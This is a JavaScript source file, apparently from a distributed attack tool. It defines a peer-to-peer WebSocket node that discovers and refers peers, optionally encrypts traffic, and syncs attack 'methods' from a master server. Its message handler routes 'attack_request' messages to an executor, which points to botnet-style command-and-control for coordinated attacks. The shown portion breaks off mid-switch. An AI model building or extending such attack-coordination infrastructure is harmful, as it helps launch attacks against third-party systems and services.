import EventEmitter from 'events';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { normalizeMethodsToLocalPaths } from './methodSync.js';
import EncryptionManager from './encryption.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

class P2PHybridNode extends EventEmitter {
  constructor(config, executor, methodsConfig) {
    super();
    
    this.config = config;
    this.executor = executor;
    this.methodsConfig = methodsConfig || {};
    this.nodeId = config.NODE.ID;
    this.nodeIp = config.NODE.IP;
    this.nodePort = config.SERVER.PORT;
    this.nodeMode = 'DIRECT';
    
    this.peers = new Map();
    this.connectionLocks = new Map();
    
    this.knownPeers = new Map();
    this.peerBlacklist = new Map();
    
    this.receivedReferrals = new Map();
    this.referralTimestamps = new Map();
    
    this.messageQueue = new Map();
    
    this.methodsVersionHash = null;
    this.methodsLastUpdate = Date.now();
    this.methodUpdatePropagationLock = new Map();
    
    this.fileCache = new Map();
    
    this.wss = null;
    this.isServerReady = false;
    
    this.stats = {
      directConnections: 0,
      relayedConnections: 0,
      messagesReceived: 0,
      messagesSent: 0,
      messagesQueued: 0,
      messagesRelayed: 0,
      peersDiscovered: 0,
      connectionAttempts: 0,
      connectionFailures: 0,
      connectionSuccesses: 0,
      methodSyncsFromPeers: 0,
      methodSyncsToMaster: 0,
      filesShared: 0,
      filesReceived: 0,
      lastDiscovery: null,
      lastAutoConnect: null,
      lastMethodSync: null,
      referralsSent: 0,
      referralsReceived: 0,
      connectionsViaReferral: 0,
      requestHandlersCleaned: 0,
      memoryLeaksPrevent: 0,
      encryptedMessagesSent: 0,
      encryptedMessagesReceived: 0,
      plainMessagesSent: 0,
      plainMessagesReceived: 0
    };
    
    this.p2pConfig = {
      enabled: config.P2P?.ENABLED !== false,
      discoveryInterval: config.P2P?.DISCOVERY_INTERVAL || 60000,
      peerTimeout: config.P2P?.PEER_TIMEOUT || 180000,
      maxPeers: config.P2P?.MAX_PEERS || 50,
      autoConnect: config.P2P?.AUTO_CONNECT !== false,
      relayFallback: config.P2P?.RELAY_FALLBACK !== false,
      heartbeatInterval: config.P2P?.HEARTBEAT_INTERVAL || 30000,
      connectionTimeout: config.P2P?.CONNECTION_TIMEOUT || 10000,
      maxConnectionAttempts: 3,
      connectionBackoffMs: 5000,
      blacklistDuration: 300000,
      messageQueueSize: 100,
      autoConnectDelay: 10000,
      cleanupInterval: 60000,
      methodSyncInterval: 120000,
      preferP2PSync: true,
      maxReferralsToSend: 5,
      referralExpiryMs: 300000,
      connectionLockTimeout: 30000,
      maxPropagationHops: 5,
      propagationCooldown: 10000
    };
    
    // Initialize encryption manager jika enabled
    this.encryptionManager = null;
    if (config.ENCRYPTION?.ENABLED) {
      try {
        this.encryptionManager = new EncryptionManager({
          ...config,
          ENCRYPTION: {
            ...config.ENCRYPTION,
            NODE_ID: config.NODE.ID
          }
        });
        console.log('[P2P] Encryption manager initialized', {
          enabled: true,
          algorithm: config.ENCRYPTION.ALGORITHM,
          version: config.ENCRYPTION.VERSION
        });
      } catch (error) {
        console.error('[P2P] Failed to initialize encryption:', error.message);
        this.encryptionManager = null;
      }
    }
    
    this.discoveryInterval = null;
    this.peerCleanupInterval = null;
    this.heartbeatInterval = null;
    this.autoConnectInterval = null;
    this.methodSyncInterval = null;
    this.handlerCleanupInterval = null;
    
    this.isShuttingDown = false;
    
    this.requestHandlers = new Map();
    this.requestHandlerTimestamps = new Map();
    
    this.masterReachable = false;
    this.lastMasterCheck = null;
    
    console.log('[P2P] P2P Hybrid Node initialized (v4.1 with Encryption)', {
      nodeId: this.nodeId,
      enabled: this.p2pConfig.enabled,
      maxPeers: this.p2pConfig.maxPeers,
      encryption: !!this.encryptionManager
    });
  }
  
  setEncryptionManager(manager) {
    if (manager && manager instanceof EncryptionManager) {
      this.encryptionManager = manager;
      console.log('[P2P] Encryption manager updated via setEncryptionManager()', {
        hasEncrypt: typeof manager.createSecureMessage === 'function',
        hasDecrypt: typeof manager.processSecureMessage === 'function'
      });
    } else {
      console.warn('[P2P] Invalid encryption manager provided');
    }
  }
  
  isEncryptionEnabled() {
    return !!(
      this.encryptionManager && 
      this.config.ENCRYPTION?.ENABLED &&
      typeof this.encryptionManager.createSecureMessage === 'function' &&
      typeof this.encryptionManager.processSecureMessage === 'function'
    );
  }
  
  // HELPER: Encrypt message before sending
  encryptMessage(message, messageType = 'p2p_message') {
    if (!this.isEncryptionEnabled()) {
      this.stats.plainMessagesSent++;
      return {
        encrypted: false,
        data: message
      };
    }
    
    try {
      const encrypted = this.encryptionManager.createSecureMessage(message, messageType);
      this.stats.encryptedMessagesSent++;
      return {
        encrypted: true,
        data: encrypted
      };
    } catch (error) {
      console.error('[P2P-ENCRYPT] Failed to encrypt message:', error.message);
      this.stats.plainMessagesSent++;
      return {
        encrypted: false,
        data: message
      };
    }
  }
  
  // HELPER: Decrypt message after receiving
  decryptMessage(data) {
    // Check if message is encrypted
    if (!data || typeof data !== 'object') {
      this.stats.plainMessagesReceived++;
      return {
        success: true,
        encrypted: false,
        data: data
      };
    }
    
    if (data.envelope === 'secure' && this.isEncryptionEnabled()) {
      try {
        const result = this.encryptionManager.processSecureMessage(data);
        if (result.success) {
          this.stats.encryptedMessagesReceived++;
          return {
            success: true,
            encrypted: true,
            data: result.data,
            metadata: result.metadata
          };
        } else {
          console.error('[P2P-DECRYPT] Failed to decrypt:', result.error);
          return {
            success: false,
            encrypted: true,
            error: result.error
          };
        }
      } catch (error) {
        console.error('[P2P-DECRYPT] Decryption error:', error.message);
        return {
          success: false,
          encrypted: true,
          error: error.message
        };
      }
    } else if (data.envelope === 'plain') {
      this.stats.plainMessagesReceived++;
      return {
        success: true,
        encrypted: false,
        data: data.payload
      };
    }
    
    // Unencrypted message (backward compatibility)
    this.stats.plainMessagesReceived++;
    return {
      success: true,
      encrypted: false,
      data: data
    };
  }
  
  setNodeMode(mode) {
    this.nodeMode = mode;
    console.log(`[P2P] Node mode set to: ${mode}`);
  }
  
  updateMethodsConfig(newConfig) {
    if (newConfig && typeof newConfig === 'object') {
      this.methodsConfig = newConfig;
      this.updateMethodsVersion();
      console.log(`[P2P] Methods config updated: ${Object.keys(this.methodsConfig).length} methods`);
      return true;
    }
    return false;
  }
  
  updateMethodsVersion() {
    try {
      const keys = Object.keys(this.methodsConfig).sort();
      const normalized = JSON.stringify(this.methodsConfig, keys);
      this.methodsVersionHash = crypto.createHash('sha256').update(normalized).digest('hex');
      this.methodsLastUpdate = Date.now();
      console.log(`[P2P-METHODS] Version hash updated: ${this.methodsVersionHash.substring(0, 8)}`);
    } catch (error) {
      console.error('[P2P-METHODS] Failed to update version hash:', error.message);
    }
  }
  
  getPeerReferrals(excludeNodeId = null) {
    const referrals = [];
    
    for (const [nodeId, peer] of this.knownPeers) {
      if (nodeId === this.nodeId) continue;
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (this.isBlacklisted(nodeId)) continue;
      
      if (!this.peers.has(nodeId) || peer.reachable) {
        referrals.push({
          nodeId: peer.nodeId,
          ip: peer.ip,
          port: peer.port,
          mode: peer.mode,
          lastSeen: peer.lastUpdate,
          methodsCount: peer.methodsCount || 0
        });
      }
      
      if (referrals.length >= this.p2pConfig.maxReferralsToSend) {
        break;
      }
    }
    
    if (referrals.length < 3) {
      for (const [nodeId, peer] of this.peers) {
        if (nodeId === this.nodeId) continue;
        if (excludeNodeId && nodeId === excludeNodeId) continue;
        
        if (!referrals.find(r => r.nodeId === nodeId)) {
          referrals.push({
            nodeId: peer.nodeId,
            ip: peer.ip,
            port: peer.port,
            mode: peer.mode,
            lastSeen: peer.lastSeen,
            methodsCount: peer.methodsCount || 0,
            note: 'connected_peer'
          });
          
          if (referrals.length >= this.p2pConfig.maxReferralsToSend) {
            break;
          }
        }
      }
    }
    
    console.log(`[P2P-REFERRAL] Prepared ${referrals.length} peer referrals`);
    return referrals;
  }
  
  async startP2PServer(fastifyServer) {
    if (!this.p2pConfig.enabled) {
      console.log('[P2P] P2P is disabled');
      return false;
    }

    if (this.isServerReady && this.wss) {
      console.log('[P2P-SERVER] P2P server already started, skipping re-init');
      return true;
    }
    
    try {
      this.wss = new WebSocketServer({ 
        noServer: true,
        clientTracking: true,
        perMessageDeflate: false
      });
      
      fastifyServer.server.on('upgrade', (request, socket, head) => {
        try {
          const url = new URL(request.url, `http://${request.headers.host}`);
          if (url.pathname === '/p2p') {
            console.log('[P2P-SERVER] Handling P2P WebSocket upgrade');
            this.wss.handleUpgrade(request, socket, head, (ws) => {
              this.wss.emit('connection', ws, request);
            });
          } else {
            socket.destroy();
          }
        } catch (error) {
          console.error('[P2P-SERVER] Upgrade error:', error.message);
          socket.destroy();
        }
      });
      
      this.wss.on('connection', (ws, request) => {
        this.handleIncomingPeerConnection(ws, request);
      });
      
      this.wss.on('error', (error) => {
        console.error('[P2P-SERVER] WebSocket server error:', error.message);
      });
      
      this.isServerReady = true;
      console.log(`[P2P-SERVER] P2P server started on port ${this.nodePort} with encryption: ${this.isEncryptionEnabled()}`);
      
      this.updateMethodsVersion();
      
      await this.checkMasterConnectivity();
      
      setTimeout(() => this.startPeerDiscovery(), 2000);
      setTimeout(() => this.startPeerCleanup(), 5000);
      setTimeout(() => this.startPeerHeartbeat(), 3000);
      setTimeout(() => this.startAutoConnector(), 15000);
      setTimeout(() => this.startMethodSyncChecker(), 30000);
      setTimeout(() => this.startHandlerCleanup(), 10000);
      
      console.log('[P2P-SERVER] Background tasks scheduled');
      
      return true;
      
    } catch (error) {
      console.error('[P2P-SERVER] Failed to start P2P server:', error.message);
      this.cleanup();
      return false;
    }
  }
  
  startHandlerCleanup() {
    if (this.handlerCleanupInterval) {
      clearInterval(this.handlerCleanupInterval);
    }
    
    this.handlerCleanupInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      
      const now = Date.now();
      const timeout = 60000;
      let cleaned = 0;
      
      for (const [key, timestamp] of this.requestHandlerTimestamps) {
        if (now - timestamp > timeout) {
          const handlerInfo = this.requestHandlers.get(key);
          if (handlerInfo) {
            const { eventName, handler } = handlerInfo;
            this.removeListener(eventName, handler);
            this.requestHandlers.delete(key);
            this.requestHandlerTimestamps.delete(key);
            cleaned++;
            this.stats.requestHandlersCleaned++;
          }
        }
      }
      
      if (cleaned > 0) {
        console.log(`[P2P-CLEANUP] Cleaned ${cleaned} stale request handlers`);
        this.stats.memoryLeaksPrevent++;
      }
    }, 30000);
    
    console.log('[P2P-CLEANUP] Handler cleanup interval started');
  }
  
  async checkMasterConnectivity() {
    if (!this.config.MASTER?.URL) {
      console.log('[P2P] No master URL configured');
      this.masterReachable = false;
      return false;
    }
    
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      
      const response = await globalThis.fetch(
        `${this.config.MASTER.URL}/api/status`,
        { signal: controller.signal }
      );
      
      clearTimeout(timeout);
      
      this.masterReachable = response.ok;
      this.lastMasterCheck = Date.now();
      
      console.log(`[P2P] Master is ${this.masterReachable ? 'reachable' : 'unreachable'}`);
      
      return this.masterReachable;
      
    } catch (error) {
      console.log('[P2P] Master check failed:', error.message);
      this.masterReachable = false;
      this.lastMasterCheck = Date.now();
      return false;
    }
  }
  
  handleIncomingPeerConnection(ws, request) {
    const remoteNodeId = request.headers['x-node-id'];
    const remoteIpRaw = request.headers['x-forwarded-for'] || request.socket.remoteAddress;
    const remoteMode = request.headers['x-node-mode'] || 'DIRECT';
    const remotePortHeader = request.headers['x-node-port'];
    const remotePort = remotePortHeader ? parseInt(remotePortHeader, 10) : null;
    const remoteEncryption = request.headers['x-encryption'] === 'enabled';

    const remoteIp = typeof remoteIpRaw === 'string'
      ? remoteIpRaw.replace('::ffff:', '')
      : remoteIpRaw;
  
    console.log('[P2P-SERVER] New peer connection attempt:', {
      remoteNodeId,
      remoteIp,
      remotePort,
      remoteMode,
      encryption: remoteEncryption
    });
  
    if (!remoteNodeId) {
      console.log('[P2P-SERVER] Rejected: Missing node ID');
      ws.close(4000, 'Missing node ID');
      return;
    }
  
    if (remoteNodeId === this.nodeId) {
      console.log('[P2P-SERVER] Rejected: Self-connection attempt');
      ws.close(4001, 'Cannot connect to self');
      return;
    }
  
    if (remoteIp === this.nodeIp && remotePort === this.nodePort) {
      console.log('[P2P-SERVER] Rejected: Same IP and port as self');
      ws.close(4001, 'Cannot connect to self (same IP:port)');
      return;
    }
  
    if (this.isBlacklisted(remoteNodeId)) {
      console.log('[P2P-SERVER] Rejected: Blacklisted');
      ws.close(4002, 'Blacklisted');
      return;
    }
  
    if (remoteIp && remotePort) {
      this.knownPeers.set(remoteNodeId, {
        nodeId: remoteNodeId,
        ip: remoteIp,
        port: remotePort,
        mode: remoteMode,
        reachable: true,
        capabilities: null,
        methodsVersion: null,
        methodsCount: 0,
        lastUpdate: Date.now(),
        supportsEncryption: remoteEncryption
      });
      console.log(`[P2P-SERVER] Added ${remoteNodeId} (${remoteIp}:${remotePort}) to known peers (${this.knownPeers.size} total)`);
    }
  
    if (this.peers.size >= this.p2pConfig.maxPeers) {
      console.log('[P2P-SERVER] Rejected: Max peers reached, sending referrals');
      
      const referrals = this.getPeerReferrals(remoteNodeId);
      this.stats.referralsSent++;
      
      try {
        const rejectMessage = {
          type: 'connection_rejected',
          reason: 'max_peers_reached',
          maxPeers: this.p2pConfig.maxPeers,
          currentPeers: this.peers.size,
          referrals,
          referralCount: referrals.length,
          nodeInfo: {
            nodeId: this.nodeId,
            ip: this.nodeIp,
            port: this.nodePort
          },
          message: `This node is full (${this.peers.size}/${this.p2pConfig.maxPeers}). Try connecting to ${referrals.length} suggested peer(s).`
        };
        
        // Encrypt rejection message if both peers support encryption
        const encrypted = this.encryptMessage(rejectMessage, 'connection_rejected');
        ws.send(JSON.stringify(encrypted.data));
        
        console.log(`[P2P-SERVER] Sent ${referrals.length} referrals to ${remoteNodeId} (encrypted: ${encrypted.encrypted})`);
      } catch (error) {
        console.error('[P2P-SERVER] Failed to send referrals:', error.message);
      }
      
      setTimeout(() => {
        ws.close(4003, 'Max peers reached - check referrals');
      }, 500);
      
      return;
    }
  
    if (this.peers.has(remoteNodeId)) {
      console.log('[P2P-SERVER] Peer already connected, replacing old connection');
      const oldPeer = this.peers.get(remoteNodeId);
      try {
        oldPeer.ws.close();
      } catch {}
      this.peers.delete(remoteNodeId);
    }
  
    const now = Date.now();
    const peerInfo = {
      ws,
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: remotePort,
      mode: remoteMode,
      connected: true,
      direct: true,
      lastSeen: now,
      lastHeartbeat: now,
      messagesReceived: 0,
      messagesSent: 0,
      connectedAt: now,
      capabilities: null,
      methodsVersion: null,
      methodsCount: 0,
      supportsEncryption: remoteEncryption,
      encryptedMessages: 0,
      plainMessages: 0
    };
  
    this.peers.set(remoteNodeId, peerInfo);
    this.connectionLocks.delete(remoteNodeId);
    this.stats.directConnections++;
    this.stats.connectionSuccesses++;
  
    // Send welcome message (encrypted if both support encryption)
    const welcomeMessage = {
      type: 'welcome',
      nodeId: this.nodeId,
      ip: this.nodeIp,
      port: this.nodePort,
      mode: this.nodeMode,
      timestamp: Date.now(),
      capabilities: {
        encryption: this.isEncryptionEnabled(),
        methods: Object.keys(this.methodsConfig),
        methodsVersion: this.methodsVersionHash,
        methodsCount: Object.keys(this.methodsConfig).length,
        relay: this.p2pConfig.relayFallback && this.masterReachable,
        fileSharing: true,
        referrals: true,
        version: '4.1'
      }
    };
    
    const encrypted = this.encryptMessage(welcomeMessage, 'welcome');
    this.sendToPeer(remoteNodeId, encrypted.data);
  
    ws.on('message', (data) => {
      try {
        const rawMessage = JSON.parse(data.toString());
        const decrypted = this.decryptMessage(rawMessage);
        if (decrypted.success && decrypted.data?.type === 'welcome') {
          // Inbound peer sent us their capabilities — update peerInfo immediately
          const msg = decrypted.data;
          const peer = this.peers.get(remoteNodeId);
          if (peer) {
            peer.capabilities = msg.capabilities || peer.capabilities;
            peer.mode = msg.mode || peer.mode;
            if (msg.capabilities) {
              peer.supportsEncryption = msg.capabilities.encryption ?? peer.supportsEncryption;
              peer.methodsVersion = msg.capabilities.methodsVersion || peer.methodsVersion;
              peer.methodsCount = msg.capabilities.methodsCount || peer.methodsCount || 0;
            }
            if (msg.ip) peer.ip = msg.ip;
            if (msg.port) peer.port = this.normalizePort(msg.port);

            // Sync knownPeers too
            const kp = this.knownPeers.get(remoteNodeId) || {};
            this.knownPeers.set(remoteNodeId, {
              ...kp,
              nodeId: remoteNodeId,
              ip: msg.ip || peer.ip,
              port: this.normalizePort(msg.port || peer.port),
              mode: msg.mode || peer.mode || 'DIRECT',
              reachable: true,
              capabilities: msg.capabilities || kp.capabilities,
              methodsVersion: msg.capabilities?.methodsVersion || kp.methodsVersion,
              methodsCount: msg.capabilities?.methodsCount || kp.methodsCount || 0,
              lastUpdate: Date.now(),
              supportsEncryption: msg.capabilities?.encryption ?? kp.supportsEncryption ?? false
            });

            console.log(
              `[P2P-SERVER] Updated REVERSE peer ${remoteNodeId} capabilities from inbound welcome:`,
              { methodsCount: peer.methodsCount, supportsEncryption: peer.supportsEncryption }
            );

            if (this.p2pConfig.preferP2PSync && peer.methodsVersion &&
                peer.methodsVersion !== this.methodsVersionHash) {
              setTimeout(() => this.requestMethodsVersionFromPeer(remoteNodeId), 1000);
            }

            this.emit('peer_info', { nodeId: remoteNodeId, capabilities: msg.capabilities, mode: msg.mode });
          }
          return; // already processed
        }
      } catch (_) { /* fall through to normal handler */ }
      this.handlePeerMessage(remoteNodeId, data);
    });
  
    ws.on('close', (code, reason) => {
      console.log(`[P2P] Peer ${remoteNodeId} disconnected (code: ${code})`);
      this.handlePeerDisconnected(remoteNodeId, code, reason);
    });
  
    ws.on('error', (error) => {
      console.error(`[P2P] Peer ${remoteNodeId} error:`, error.message);
    });
  
    ws.on('pong', () => {
      if (this.peers.has(remoteNodeId)) {
        this.peers.get(remoteNodeId).lastSeen = Date.now();
      }
    });
  
    this.emit('peer_connected', {
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: remotePort,
      mode: remoteMode,
      direct: true,
      encrypted: encrypted.encrypted
    });
  
    this.processQueuedMessages(remoteNodeId);
  
    console.log(
      `[P2P] Peer ${remoteNodeId} (${remoteMode}) at ${remoteIp}:${remotePort} connected successfully (` +
      `${this.peers.size}/${this.p2pConfig.maxPeers}, encryption: ${encrypted.encrypted})`
    );
  }
  
  handlePeerDisconnected(nodeId, code, reason) {
    if (!this.peers.has(nodeId) && !this.connectionLocks.has(nodeId)) {
      return;
    }

    this.peers.delete(nodeId);
    this.connectionLocks.delete(nodeId);
    
    this.emit('peer_disconnected', { 
      nodeId,
      code,
      reason: reason?.toString() || 'Unknown'
    });
  }
  
  isBlacklisted(nodeId) {
    const entry = this.peerBlacklist.get(nodeId);
    if (!entry) return false;
    
    if (Date.now() > entry.until) {
      this.peerBlacklist.delete(nodeId);
      return false;
    }
    
    return true;
  }
  
  blacklistPeer(nodeId, reason, duration = null) {
    const until = Date.now() + (duration || this.p2pConfig.blacklistDuration);
    this.peerBlacklist.set(nodeId, { reason, until });
    console.log(
      `[P2P] Blacklisted peer ${nodeId} for ${Math.round((until - Date.now())/1000)}s: ${reason}`
    );
  }
  
  normalizePort(port) {
    if (typeof port === 'string') {
      const parsed = parseInt(port, 10);
      return Number.isNaN(parsed) ? null : parsed;
    }
    return typeof port === 'number' ? port : null;
  }
  
  handleConnectionRejected(nodeId, message) {
    const { reason, maxPeers, currentPeers, referrals, referralCount } = message;
    
    console.log(`[P2P-REFERRAL] Connection to ${nodeId} rejected: ${reason}`);
    console.log(`[P2P-REFERRAL] Node is full: ${currentPeers}/${maxPeers}`);
    console.log(`[P2P-REFERRAL] Received ${referralCount} peer referral(s)`);
    
    if (!referrals || referrals.length === 0) {
      console.log('[P2P-REFERRAL] No referrals provided');
      return;
    }
    
    this.stats.referralsReceived++;
    
    const referralData = {
      referrals,
      timestamp: Date.now(),
      fromNode: message.nodeInfo
    };
    this.receivedReferrals.set(nodeId, referralData);
    this.referralTimestamps.set(nodeId, Date.now());
    
    const now = Date.now();
    for (const referral of referrals) {
      if (referral.nodeId === this.nodeId) continue;
      
      const existing = this.knownPeers.get(referral.nodeId);
      if (!existing || existing.lastUpdate < now - 60000) {
        this.knownPeers.set(referral.nodeId, {
          nodeId: referral.nodeId,
          ip: referral.ip,
          port: this.normalizePort(referral.port),
          mode: referral.mode || 'DIRECT',
          reachable: true,
          capabilities: null,
          methodsVersion: null,
          methodsCount: referral.methodsCount || 0,
          lastUpdate: now,
          fromReferral: true,
          referredBy: nodeId
        });
        
        console.log(
          `[P2P-REFERRAL] Added peer ${referral.nodeId} (${referral.ip}:${referral.port}) to known peers`
        );
      }
    }
    
    if (this.p2pConfig.autoConnect && this.peers.size < this.p2pConfig.maxPeers) {
      console.log('[P2P-REFERRAL] Attempting to connect to referral peers...');
      setTimeout(() => this.connectToReferralPeers(referrals), 2000);
    }
  }
  
  async connectToReferralPeers(referrals) {
    if (!referrals || referrals.length === 0) return;
    
    const availableSlots = this.p2pConfig.maxPeers - this.peers.size - this.connectionLocks.size;
    if (availableSlots <= 0) {
      console.log('[P2P-REFERRAL] No available slots for referral connections');
      return;
    }
    
    console.log(
      `[P2P-REFERRAL] Connecting to up to ${Math.min(availableSlots, referrals.length)} referral peer(s)`
    );
    
    let connected = 0;
    
    for (const referral of referrals) {
      if (connected >= availableSlots) break;
      if (this.peers.has(referral.nodeId) || referral.nodeId === this.nodeId) continue;
      if (this.connectionLocks.has(referral.nodeId)) continue;
      
      try {
        const result = await this.connectToPeer(referral.nodeId, {
          ip: referral.ip,
          port: referral.port,
          mode: referral.mode || 'DIRECT',
          methodsCount: referral.methodsCount || 0
        });
        
        if (result.success) {
          connected++;
          this.stats.connectionsViaReferral++;
          console.log(`[P2P-REFERRAL] ✓ Connected to referral peer ${referral.nodeId}`);
        } else {
          console.log(
            `[P2P-REFERRAL] ✗ Failed to connect to ${referral.nodeId}: ${result.error}`
          );
        }
        
        await new Promise(resolve => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(
          `[P2P-REFERRAL] Error connecting to ${referral.nodeId}:`,
          error.message
        );
      }
    }
    
    console.log(`[P2P-REFERRAL] Connected to ${connected} referral peer(s)`);
  }
  
  async connectToPeer(nodeId, peerInfo, retryAttempt = 0) {
    if (nodeId === this.nodeId) {
      return { success: false, error: 'Cannot connect to self' };
    }
    
    const normalizedPort = this.normalizePort(peerInfo.port);
    
    if (peerInfo.ip === this.nodeIp && normalizedPort === this.nodePort) {
      return { success: false, error: 'Cannot connect to self (same IP:port)' };
    }
    
    if (this.peers.has(nodeId)) {
      return { success: true, existing: true };
    }
    
    if (this.isBlacklisted(nodeId)) {
      return { success: false, error: 'Peer is blacklisted' };
    }
    
    if (this.connectionLocks.has(nodeId)) {
      const lockTime = this.connectionLocks.get(nodeId);
      if (Date.now() - lockTime < this.p2pConfig.connectionLockTimeout) {
        return { success: false, error: 'Connection already in progress' };
      }
      console.log(`[P2P] Stale connection lock detected for ${nodeId}, removing`);
      this.connectionLocks.delete(nodeId);
    }
    
    const totalConnections = this.peers.size + this.connectionLocks.size;
    if (totalConnections >= this.p2pConfig.maxPeers) {
      return { success: false, error: 'Max peers reached (including pending)' };
    }
    
    if (retryAttempt >= this.p2pConfig.maxConnectionAttempts) {
      this.blacklistPeer(nodeId, `Max connection attempts (${retryAttempt}) reached`);
      return { success: false, error: 'Max attempts reached' };
    }
    
    if (!peerInfo.ip || !normalizedPort) {
      return { success: false, error: 'Missing peer IP or port' };
    }
    
    this.connectionLocks.set(nodeId, Date.now());
    this.stats.connectionAttempts++;
    
    try {
      const wsUrl = `ws://${peerInfo.ip}:${normalizedPort}/p2p`;
      
      console.log(
        `[P2P] Connecting to peer ${nodeId} at ${wsUrl} ` +
        `(attempt ${retryAttempt + 1}/${this.p2pConfig.maxConnectionAttempts})`
      );
      
      const ws = new WebSocket(wsUrl, {
        headers: {
          'X-Node-ID': this.nodeId,
          'X-Node-IP': this.nodeIp || 'unknown',
          'X-Node-Port': this.nodePort.toString(),
          'X-Node-Mode': this.nodeMode,
          'X-Encryption': this.isEncryptionEnabled() ? 'enabled' : 'disabled'
        },
        handshakeTimeout: this.p2pConfig.connectionTimeout
      });
      
      return new Promise((resolve) => {
        let resolved = false;
        let timeoutHandle = null;
        
        const finish = (result, keepLock) => {
          if (resolved) return;
          resolved = true;

          if (!keepLock) this.connectionLocks.delete(nodeId);
          if (timeoutHandle) clearTimeout(timeoutHandle);
          resolve(result);
        };
        
        const maybeRetry = (baseError) => {
          const totalNow = this.peers.size + this.connectionLocks.size - 1;
          if (totalNow >= this.p2pConfig.maxPeers) {
            finish({ success: false, error: 'Max peers reached' }, false);
            return;
          }
          
          if (retryAttempt < this.p2pConfig.maxConnectionAttempts - 1) {
            const backoff = this.p2pConfig.connectionBackoffMs * (retryAttempt + 1);
            console.log(`[P2P] ${baseError}, retrying in ${backoff}ms...`);
            finish({ success: false, error: baseError, willRetry: true }, false);
            
            setTimeout(() => {
              this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
            }, backoff);
          } else {
            finish({ success: false, error: baseError }, false);
          }
        };

        timeoutHandle = setTimeout(() => {
          try { ws.terminate(); } catch {}
          this.stats.connectionFailures++;
          
          if (this.peers.has(nodeId)) {
            finish({ success: true, existing: true }, true);
            return;
          }
          
          maybeRetry('Connection timeout');
        }, this.p2pConfig.connectionTimeout);
        
        ws.on('open', () => {
          if (this.peers.size >= this.p2pConfig.maxPeers) {
            console.log(`[P2P] Max peers reached during connection to ${nodeId}, closing`);
            try { ws.close(4003, 'Max peers reached'); } catch {}
            finish({ success: false, error: 'Max peers reached' }, false);
            return;
          }
          
          const now = Date.now();
          const peer = {
            ws,
            nodeId,
            ip: peerInfo.ip,
            port: normalizedPort,
            mode: peerInfo.mode || 'DIRECT',
            connected: true,
            direct: true,
            lastSeen: now,
            lastHeartbeat: now,
            messagesReceived: 0,
            messagesSent: 0,
            connectedAt: now,
            capabilities: peerInfo.capabilities || null,
            methodsVersion: peerInfo.methodsVersion || null,
            methodsCount: peerInfo.methodsCount || 0,
            supportsEncryption: false,
            encryptedMessages: 0,
            plainMessages: 0
          };
          
          this.peers.set(nodeId, peer);
          this.connectionLocks.delete(nodeId);
          this.stats.directConnections++;
          this.stats.connectionSuccesses++;
          
          // Send our own welcome/capabilities to the server-side peer so it can
          // populate its peerInfo.capabilities (fixes null capabilities on REVERSE mode)
          const selfWelcome = {
            type: 'welcome',
            nodeId: this.nodeId,
            ip: this.nodeIp,
            port: this.nodePort,
            mode: this.nodeMode,
            timestamp: now,
            capabilities: {
              encryption: this.isEncryptionEnabled(),
              methods: Object.keys(this.methodsConfig),
              methodsVersion: this.methodsVersionHash,
              methodsCount: Object.keys(this.methodsConfig).length,
              relay: this.p2pConfig.relayFallback && this.masterReachable,
              fileSharing: true,
              referrals: true,
              version: '4.1'
            }
          };
          const selfWelcomeEncrypted = this.encryptMessage(selfWelcome, 'welcome');
          try {
            ws.send(JSON.stringify(selfWelcomeEncrypted.data));
            peer.messagesSent++;
            this.stats.messagesSent++;
          } catch (e) {
            console.error(`[P2P] Failed to send self-welcome to ${nodeId}:`, e.message);
          }
          
          ws.on('message', (data) => this.handlePeerMessage(nodeId, data));
          
          ws.on('close', (code, reason) => {
            console.log(`[P2P] Peer ${nodeId} disconnected (code: ${code})`);
            this.handlePeerDisconnected(nodeId, code, reason);
          });
          
          ws.on('error', (error) => {
            console.error(`[P2P] Peer ${nodeId} error:`, error.message);
          });
          
          ws.on('pong', () => {
            if (this.peers.has(nodeId)) {
              this.peers.get(nodeId).lastSeen = Date.now();
            }
          });
          
          this.emit('peer_connected', {
            nodeId,
            ip: peerInfo.ip,
            port: normalizedPort,
            mode: peerInfo.mode || 'DIRECT',
            direct: true
          });
          
          this.processQueuedMessages(nodeId);
          
          console.log(
            `[P2P] Connected to peer ${nodeId} at ${peerInfo.ip}:${normalizedPort} ` +
            `(${peerInfo.mode || 'DIRECT'}) successfully`
          );
          finish({ success: true, direct: true }, true);
        });
        
        ws.on('error', (error) => {
          this.stats.connectionFailures++;
          console.log(`[P2P] Failed to connect to ${nodeId}: ${error.message}`);
          
          if (this.peers.has(nodeId)) {
            finish({ success: true, existing: true }, true);
            return;
          }
          
          maybeRetry(error.message);
        });
      });
      
    } catch (error) {
      this.connectionLocks.delete(nodeId);
      this.stats.connectionFailures++;
      console.error(`[P2P] Connection error to ${nodeId}:`, error.message);
      return { success: false, error: error.message };
    }
  }
  
  handlePeerMessage(nodeId, data) {
    try {
      const rawMessage = JSON.parse(data.toString());
      const decrypted = this.decryptMessage(rawMessage);
      
      if (!decrypted.success) {
        console.error(`[P2P] Failed to decrypt message from ${nodeId}:`, decrypted.error);
        return;
      }
      
      const message = decrypted.data;
      
      const peer = this.peers.get(nodeId);
      if (peer) {
        peer.lastSeen = Date.now();
        peer.messagesReceived++;
        
        if (decrypted.encrypted) {
          peer.encryptedMessages++;
        } else {
          peer.plainMessages++;
        }
      }
      
      this.stats.messagesReceived++;
      
      console.log(`[P2P] Message from ${nodeId}: ${message.type} (encrypted: ${decrypted.encrypted})`);
      
      switch (message.type) {
        case 'connection_rejected':
          this.handleConnectionRejected(nodeId, message);
          break;
        case 'welcome':
          this.handleWelcomeMessage(nodeId, message);
          break;
        case 'ping': {
          const pongMessage = { type: 'pong', timestamp: Date.now() };
          const encrypted = this.encryptMessage(pongMessage, 'pong');
          this.sendToPeer(nodeId, encrypted.data);
          break;
        }
        case 'pong':
          if (peer) peer.lastHeartbeat = Date.now();
          break;
        case 'attack_request':
          this.handleAttackRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'attack_response':
